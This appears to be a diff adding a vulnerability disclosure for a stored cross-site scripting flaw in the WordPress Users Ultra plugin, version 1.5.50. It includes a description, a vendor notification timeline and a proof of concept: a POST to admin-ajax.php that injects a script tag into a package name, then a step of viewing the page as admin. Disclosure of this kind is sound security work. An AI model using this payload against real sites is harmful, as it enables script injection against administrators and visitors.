@@ -1,0 +1,49 @@
+* Exploit Title: WordPress Users Ultra Plugin [Persistence XSS]
+* Discovery Date: 2015/10/20
+* Public Disclosure Date: 2015/12/01
+* Exploit Author: Panagiotis Vagenas
+* Contact: https://twitter.com/panVagenas
+* Vendor Homepage: http://usersultra.com
+* Software Link: https://wordpress.org/plugins/users-ultra/
+* Version: 1.5.50
+* Tested on: WordPress 4.3.1
+* Category: webapps
+
+
+Description
+========================================================================
+========
+
+Once a user is registered he can add new subscription packages or
+modify existing ones. No data sanitization is
+taking place before saving package details in DB. This allows a
+malicious user to include JS code in package name
+and/or package description.
+
+PoC
+========================================================================
+========
+
+- - Send a post request to
+`http://vuln.site.tld/wp-admin/admin-ajax.php` with data:
+`action=package_add_new&p_name=a<script>alert(1)</script>`
+- - Visit
+`http://vuln.site.tld/wp-admin/admin.php?page=userultra&tab=membership`
+as
+admin or go to the page that
+contains package information at front end.
+
+Timeline
+========================================================================
+========
+
+2015/10/29 - Vendor notified via email
+2015/11/11 - Vendor notified via contact form in his website
+2015/11/13 - Vendor notified via support forums at wordpress.org
+2015/11/14 - Vendor responded and received report through email
+
+Solution
+========================================================================
+========
+
+No official solution yet exists.
